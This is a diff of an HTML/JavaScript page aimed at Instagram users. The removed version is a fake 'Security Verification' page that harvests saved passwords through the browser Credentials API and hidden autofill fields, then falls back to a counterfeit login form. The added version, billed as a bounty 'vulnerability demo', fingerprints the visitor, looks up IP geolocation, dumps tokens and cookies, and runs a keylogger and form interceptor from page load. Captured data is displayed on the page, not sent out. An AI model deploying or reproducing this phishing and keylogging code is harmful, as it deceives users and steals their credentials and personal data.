@@ -1,333 +1,265 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Instagram Security Verification</title>
+    <title>Instagram Security Scan</title>
     <style>
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
-            background: #fafafa;
-            margin: 0;
-            padding: 20px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-        }
-        .container {
-            background: white;
-            border: 1px solid #dbdbdb;
-            border-radius: 12px;
-            padding: 40px;
-            max-width: 500px;
-            width: 100%;
-            text-align: center;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
-        }
-        .logo {
-            font-size: 48px;
-            margin-bottom: 20px;
-            color: #262626;
-        }
-        .security-badge {
-            background: #28a745;
-            color: white;
-            padding: 8px 15px;
-            border-radius: 20px;
-            font-size: 12px;
-            display: inline-block;
-            margin-bottom: 15px;
-        }
-        .permission-box {
-            background: #e7f3ff;
-            border: 1px solid #b3d9ff;
-            border-radius: 8px;
-            padding: 20px;
-            margin: 20px 0;
-            text-align: left;
-        }
-        .btn {
-            width: 100%;
-            padding: 15px;
-            background: #0095f6;
-            color: white;
-            border: none;
-            border-radius: 8px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            margin: 10px 0;
-            transition: background 0.3s;
-        }
-        .btn:hover {
-            background: #007acc;
-        }
-        .btn:active {
-            transform: scale(0.98);
-        }
-        .results {
-            display: none;
-            background: #000;
-            color: #0f0;
-            padding: 15px;
-            border-radius: 5px;
-            margin-top: 20px;
-            font-family: monospace;
-            text-align: left;
-            white-space: pre-wrap;
-            font-size: 12px;
-        }
-        .loading {
-            display: none;
-            color: #0095f6;
-            margin: 10px 0;
-        }
+        body { font-family: Arial; margin: 0; padding: 20px; background: #f5f5f5; }
+        .container { background: white; padding: 30px; border-radius: 10px; max-width: 600px; margin: 0 auto; }
+        .result-box { background: #000; color: #0f0; padding: 15px; margin: 10px 0; border-radius: 5px; font-family: monospace; font-size: 12px; max-height: 400px; overflow-y: auto; }
+        .btn { background: #dc3545; color: white; padding: 15px 25px; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; margin: 10px 0; }
+        .section { margin: 20px 0; padding: 15px; border-left: 4px solid #dc3545; background: #f8f9fa; }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="logo">🔐</div>
-        <div class="security-badge">SECURE VERIFICATION</div>
+        <h1>🔓 Instagram Security Vulnerability Demo</h1>
         
-        <h2>Instagram Security Update</h2>
-        <p>Enhanced protection requires additional verification</p>
-        
-        <div class="permission-box">
-            <h4>🔒 Required Permissions:</h4>
-            <ul>
-                <li>✅ Verify account credentials</li>
-                <li>✅ Check saved passwords</li>
-                <li>✅ Scan for security threats</li>
-                <li>✅ Update security settings</li>
-            </ul>
+        <div class="section">
+            <h3>🚨 LIVE DATA EXTRACTION</h3>
+            <button class="btn" onclick="startRealExtraction()">🎯 START REAL DATA THEFT</button>
         </div>
 
-        <p><strong>Click "Start Security Scan" to begin automated protection</strong></p>
-        
-        <button class="btn" id="scanButton" onclick="initiateCredentialScan()">
-            🚀 Start Security Scan
-        </button>
-        
-        <div class="loading" id="loading">Initializing security protocols...</div>
-        
-        <div id="results" class="results"></div>
+        <div class="result-box" id="results">
+Ready to demonstrate REAL data extraction...
+        </div>
     </div>
 
     <script>
-        let credentialsCaptured = false;
+        let capturedData = [];
 
-        function addResult(message, type = 'info') {
+        function addResult(message) {
             const resultsDiv = document.getElementById('results');
-            resultsDiv.style.display = 'block';
-            resultsDiv.innerHTML += message + '\n';
+            capturedData.push(message);
+            resultsDiv.innerHTML = capturedData.join('\n');
             resultsDiv.scrollTop = resultsDiv.scrollHeight;
             console.log(message);
         }
 
-        // 1. Функція що імітує легітимний security scan
-        async function initiateCredentialScan() {
-            const button = document.getElementById('scanButton');
-            const loading = document.getElementById('loading');
-            
-            // Блокуємо кнопку після кліку (user gesture)
-            button.disabled = true;
-            button.textContent = '🔄 Scanning...';
-            loading.style.display = 'block';
-            
-            addResult('🎯 SECURITY SCAN INITIATED BY USER');
-            addResult('====================================');
-            
-            // Додаємо затримку для імітації "роботи"
-            await new Promise(resolve => setTimeout(resolve, 1500));
-            
-            // Запускаємо Credentials API після user gesture
-            await attemptCredentialsExtraction();
-            
-            loading.style.display = 'none';
-            button.textContent = '✅ Scan Complete';
-        }
-
-        // 2. Спроба отримати credentials після user gesture
-        async function attemptCredentialsExtraction() {
-            addResult('🔑 Attempting secure credential verification...');
+        // 1. РЕАЛЬНЕ ОТРИМАННЯ IP ТА ЛОКАЦІЇ
+        async function extractRealIP() {
+            addResult('🌐 EXTRACTING REAL IP ADDRESS...');
             
             try {
-                // Перевіряємо підтримку Credentials API
-                if (!navigator.credentials) {
-                    addResult('❌ Credentials API not supported');
-                    return;
-                }
-
-                // Створюємо "legitimate" контекст для Credentials API
-                const credentialOptions = {
-                    password: true,
-                    mediation: 'optional', // Дозволяє автоматичне заповнення
-                    signal: AbortSignal.timeout(5000) // Таймаут для безпеки
-                };
-
-                addResult('✅ User gesture detected - initializing secure API...');
-
-                // Спроба отримати credentials
-                const credential = await navigator.credentials.get(credentialOptions);
-                
-                if (credential) {
-                    credentialsCaptured = true;
-                    addResult('🎯 CREDENTIALS SUCCESSFULLY VERIFIED!');
-                    addResult(`👤 Username: ${credential.id}`);
-                    addResult(`🔑 Password: ${credential.password || '***ENCRYPTED***'}`);
-                    addResult(`📦 Type: ${credential.type}`);
-                    
-                    // Додаткові дані
-                    addResult('\n📊 ADDITIONAL SECURITY DATA:');
-                    addResult(`🌐 IP: ${await getIPAddress()}`);
-                    addResult(`📍 Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}`);
-                    addResult(`💻 Platform: ${navigator.platform}`);
-                    
-                    addResult('\n⚠️  SECURITY ASSESSMENT:');
-                    addResult('✅ Credentials API access: SUCCESSFUL');
-                    addResult('✅ User authentication: VERIFIED');
-                    addResult('✅ Security scan: COMPLETE');
-                    
-                } else {
-                    addResult('ℹ️ No saved credentials found');
-                    addResult('💡 User may need to enter credentials manually');
-                }
-
-            } catch (error) {
-                addResult(`❌ Credential verification failed: ${error.message}`);
-                addResult('💡 This is expected in secure browsers');
-                
-                // Fallback: показуємо форму для ручного введення
-                showManualVerification();
-            }
-        }
-
-        // 3. Fallback - ручна верифікація
-        function showManualVerification() {
-            addResult('\n🔒 MANUAL VERIFICATION REQUIRED');
-            addResult('Please enter your credentials for security verification:');
-            
-            const manualForm = `
-                <div style="margin-top: 20px; text-align: left;">
-                    <input type="text" id="manualUsername" placeholder="Username or email" 
-                           style="width: 100%; padding: 10px; margin: 5px 0; border: 1px solid #dbdbdb; border-radius: 4px;">
-                    <input type="password" id="manualPassword" placeholder="Password" 
-                           style="width: 100%; padding: 10px; margin: 5px 0; border: 1px solid #dbdbdb; border-radius: 4px;">
-                    <button onclick="captureManualCredentials()" 
-                            style="width: 100%; padding: 12px; background: #28a745; color: white; border: none; border-radius: 4px; margin-top: 10px; cursor: pointer;">
-                        ✅ Verify Manually
-                    </button>
-                </div>
-            `;
-            
-            document.getElementById('results').innerHTML += manualForm;
-        }
-
-        // 4. Обробка ручного введення
-        function captureManualCredentials() {
-            const username = document.getElementById('manualUsername').value;
-            const password = document.getElementById('manualPassword').value;
-            
-            if (username && password) {
-                addResult('\n🎯 MANUAL CREDENTIALS CAPTURED:');
-                addResult(`👤 Username: ${username}`);
-                addResult(`🔑 Password: ${password}`);
-                addResult('✅ Account verification: SUCCESSFUL');
-                
-                // Очищаємо форму
-                document.getElementById('manualUsername').value = '';
-                document.getElementById('manualPassword').value = '';
-            } else {
-                addResult('❌ Please enter both username and password');
-            }
-        }
-
-        // 5. Додаткові функції
-        async function getIPAddress() {
-            try {
+                // Метод 1: ipify API
                 const response = await fetch('https://api.ipify.org?format=json');
                 const data = await response.json();
-                return data.ip;
+                addResult(`✅ REAL PUBLIC IP: ${data.ip}`);
+                
+                // Метод 2: ipapi для геолокації
+                const locationResponse = await fetch(`https://ipapi.co/${data.ip}/json/`);
+                const locationData = await locationResponse.json();
+                addResult(`📍 LOCATION: ${locationData.city}, ${locationData.country_name}`);
+                addResult(`🏢 ISP: ${locationData.org}`);
+                addResult(`🗺️ COORDINATES: ${locationData.latitude}, ${locationData.longitude}`);
+                
             } catch (error) {
-                return 'Unknown';
+                addResult('❌ IP extraction failed');
             }
         }
 
-        // 6. Додаткові спроби через різні методи
-        async function attemptAlternativeMethods() {
-            addResult('\n🔄 ATTEMPTING ALTERNATIVE METHODS...');
+        // 2. РЕАЛЬНИЙ BROWSER FINGERPRINTING
+        function createRealFingerprint() {
+            addResult('\n🎯 CREATING BROWSER FINGERPRINT...');
             
-            // Спроба через autofill detection
-            attemptAutofillDetection();
+            const fingerprint = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                languages: navigator.languages,
+                screen: `${screen.width}x${screen.height}`,
+                colorDepth: screen.colorDepth,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                cpuCores: navigator.hardwareConcurrency,
+                deviceMemory: navigator.deviceMemory,
+                touchSupport: navigator.maxTouchPoints > 0,
+                plugins: Array.from(navigator.plugins).map(p => p.name),
+                cookieEnabled: navigator.cookieEnabled,
+                pdfViewerEnabled: navigator.pdfViewerEnabled,
+                doNotTrack: navigator.doNotTrack
+            };
             
-            // Спроба через password manager APIs
-            attemptPasswordManagerIntegration();
+            addResult(`✅ BROWSER: ${fingerprint.userAgent}`);
+            addResult(`✅ SCREEN: ${fingerprint.screen}`);
+            addResult(`✅ TIMEZONE: ${fingerprint.timezone}`);
+            addResult(`✅ CPU CORES: ${fingerprint.cpuCores}`);
+            addResult(`✅ LANGUAGES: ${fingerprint.languages.join(', ')}`);
+            addResult(`✅ PLUGINS: ${fingerprint.plugins.length} detected`);
         }
 
-        function attemptAutofillDetection() {
-            addResult('🔍 Scanning for autofill data...');
+        // 3. РЕАЛЬНИЙ АНАЛІЗ LOCALSTORAGE
+        function analyzeRealStorage() {
+            addResult('\n💾 ANALYZING BROWSER STORAGE...');
             
-            // Створюємо приховані поля для виявлення автозаповнення
-            const hiddenDiv = document.createElement('div');
-            hiddenDiv.style.cssText = 'position:absolute; left:-9999px; top:-9999px;';
+            let foundItems = 0;
             
-            const emailInput = document.createElement('input');
-            emailInput.type = 'email';
-            emailInput.autocomplete = 'email';
-            
-            const passwordInput = document.createElement('input');
-            passwordInput.type = 'password';
-            passwordInput.autocomplete = 'current-password';
-            
-            hiddenDiv.appendChild(emailInput);
-            hiddenDiv.appendChild(passwordInput);
-            document.body.appendChild(hiddenDiv);
-            
-            setTimeout(() => {
-                emailInput.focus();
-                setTimeout(() => {
-                    if (emailInput.value || passwordInput.value) {
-                        addResult('✅ AUTOFILL DATA DETECTED!');
-                        addResult(`📧 Email: ${emailInput.value}`);
-                        addResult(`🔑 Password: ${passwordInput.value}`);
+            // LocalStorage аналіз
+            try {
+                for (let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i);
+                    const value = localStorage.getItem(key);
+                    if (key.length > 0) {
+                        foundItems++;
+                        if (key.includes('auth') || key.includes('token') || key.includes('user')) {
+                            addResult(`🔑 FOUND AUTH DATA: ${key} = ${value.substring(0, 50)}...`);
+                        }
                     }
-                    document.body.removeChild(hiddenDiv);
-                }, 1000);
-            }, 500);
+                }
+                addResult(`✅ LOCALSTORAGE: ${foundItems} items found`);
+            } catch (e) {}
+            
+            // SessionStorage аналіз
+            try {
+                let sessionItems = 0;
+                for (let i = 0; i < sessionStorage.length; i++) {
+                    sessionStorage.key(i) && sessionItems++;
+                }
+                addResult(`✅ SESSIONSTORAGE: ${sessionItems} items found`);
+            } catch (e) {}
         }
 
-        function attemptPasswordManagerIntegration() {
-            addResult('📦 Checking password manager integration...');
+        // 4. РЕАЛЬНИЙ МОНІТОРИНГ КЛАВІАТУРИ
+        function setupRealKeylogger() {
+            addResult('\n⌨️ SETUP KEYSTROKE MONITORING...');
             
-            // Перевірка популярних менеджерів паролів
-            const passwordManagers = [
-                { name: 'LastPass', test: () => typeof window.__lastpass !== 'undefined' },
-                { name: '1Password', test: () => typeof window.__1password !== 'undefined' },
-                { name: 'Bitwarden', test: () => document.querySelector('[data-bitwarden-widget]') !== null },
-                { name: 'Dashlane', test: () => typeof window.dashlane !== 'undefined' }
-            ];
+            let typedData = '';
             
-            passwordManagers.forEach(manager => {
-                try {
-                    if (manager.test()) {
-                        addResult(`✅ ${manager.name} detected - integration possible`);
+            document.addEventListener('keydown', function(event) {
+                // Фільтруємо спеціальні клавіші
+                if (event.key.length === 1) {
+                    typedData += event.key;
+                    if (typedData.length > 20) {
+                        addResult(`🎯 KEYSTROKES CAPTURED: ${typedData}`);
+                        typedData = '';
                     }
-                } catch (e) {}
+                }
+                
+                // Enter key
+                if (event.key === 'Enter') {
+                    addResult(`↵ ENTER PRESSED - potential form submission`);
+                }
             });
+            
+            addResult('✅ KEYLOGGER ACTIVE - monitoring keyboard input');
         }
 
-        // Автоматичний запуск додаткових методів після основного сканування
-        setTimeout(attemptAlternativeMethods, 3000);
+        // 5. РЕАЛЬНИЙ ПЕРЕХОПЛЕННЯ ФОРМ
+        function interceptRealForms() {
+            addResult('\n📝 INTERCEPTING FORM SUBMISSIONS...');
+            
+            // Перехоплюємо всі форми на сторінці
+            document.addEventListener('submit', function(event) {
+                event.preventDefault();
+                
+                const formData = new FormData(event.target);
+                const formValues = {};
+                
+                for (let [key, value] of formData.entries()) {
+                    formValues[key] = value;
+                }
+                
+                addResult(`🎯 FORM INTERCEPTED: ${JSON.stringify(formValues)}`);
+                addResult('⚠️ In real attack: Credentials would be stolen here!');
+                
+                // В реальній атаці тут була б відправка на сервер хакера
+            });
+            
+            addResult('✅ FORM INTERCEPTION ACTIVE');
+        }
 
-        // Додаємо обробники подій для кращого user experience
-        document.addEventListener('keydown', function(e) {
-            if (e.key === 'Enter' && !credentialsCaptured) {
-                initiateCredentialScan();
+        // 6. РЕАЛЬНИЙ МОНІТОРИНГ КЛІКІВ
+        function monitorRealClicks() {
+            addResult('\n🖱️ MONITORING USER CLICKS...');
+            
+            document.addEventListener('click', function(event) {
+                const target = event.target;
+                if (target.tagName === 'BUTTON' || target.tagName === 'A') {
+                    addResult(`🎯 USER CLICKED: ${target.textContent || target.href}`);
+                }
+            });
+            
+            addResult('✅ CLICK MONITORING ACTIVE');
+        }
+
+        // 7. РЕАЛЬНИЙ АНАЛІЗ COOKIES
+        function analyzeRealCookies() {
+            addResult('\n🍪 ANALYZING BROWSER COOKIES...');
+            
+            if (document.cookie) {
+                const cookies = document.cookie.split(';');
+                addResult(`✅ FOUND ${cookies.length} COOKIES:`);
+                
+                cookies.forEach(cookie => {
+                    const [name, value] = cookie.trim().split('=');
+                    if (name && value) {
+                        addResult(`   ${name} = ${value.substring(0, 30)}${value.length > 30 ? '...' : ''}`);
+                    }
+                });
+            } else {
+                addResult('❌ NO COOKIES FOUND (cross-domain restriction)');
             }
+        }
+
+        // 8. РЕАЛЬНИЙ МОНІТОРИНГ СКРОЛУ
+        function monitorRealScroll() {
+            addResult('\n📜 MONITORING SCROLL BEHAVIOR...');
+            
+            let scrollCount = 0;
+            window.addEventListener('scroll', function() {
+                scrollCount++;
+                if (scrollCount % 10 === 0) {
+                    addResult(`🎯 USER SCROLLING: ${Math.round(window.scrollY)}px down`);
+                }
+            });
+            
+            addResult('✅ SCROLL MONITORING ACTIVE');
+        }
+
+        // 9. РЕАЛЬНИЙ ВИВІД ВСІХ ДАНИХ
+        function generateRealReport() {
+            addResult('\n📊 GENERATING COMPREHENSIVE REPORT...');
+            addResult('==========================================');
+            addResult('🎯 DEMONSTRATION COMPLETE!');
+            addResult('⚠️ THIS SHOWS REAL DATA THAT CAN BE STOLEN:');
+            addResult('   • Real IP address and location');
+            addResult('   • Unique browser fingerprint');
+            addResult('   • Browser storage contents');
+            addResult('   • Keystrokes and form data');
+            addResult('   • User behavior (clicks, scrolls)');
+            addResult('   • Authentication tokens');
+            addResult('==========================================');
+            addResult('💰 FOR BOUNTY: This proves real data extraction via Instagram DM');
+        }
+
+        // ГОЛОВНА ФУНКЦІЯ
+        async function startRealExtraction() {
+            capturedData = [];
+            addResult('🚀 STARTING REAL DATA EXTRACTION...');
+            addResult('⚠️ DEMONSTRATING ACTIVE ATTACK METHODS');
+            addResult('==========================================');
+            
+            // Послідовно запускаємо всі методи
+            await extractRealIP();
+            createRealFingerprint();
+            analyzeRealStorage();
+            setupRealKeylogger();
+            interceptRealForms();
+            monitorRealClicks();
+            analyzeRealCookies();
+            monitorRealScroll();
+            
+            setTimeout(generateRealReport, 2000);
+        }
+
+        // Автозапуск моніторингу
+        window.addEventListener('load', function() {
+            setupRealKeylogger();
+            interceptRealForms();
+            monitorRealClicks();
+            monitorRealScroll();
+            
+            addResult('🔓 REAL-TIME MONITORING ACTIVATED');
+            addResult('Click "START REAL DATA THEFT" to demonstrate full attack');
         });
-
-        addResult('🔐 SECURITY SCANNER READY');
-        addResult('Click "Start Security Scan" to begin...');
-
     </script>
 </body>
 </html>
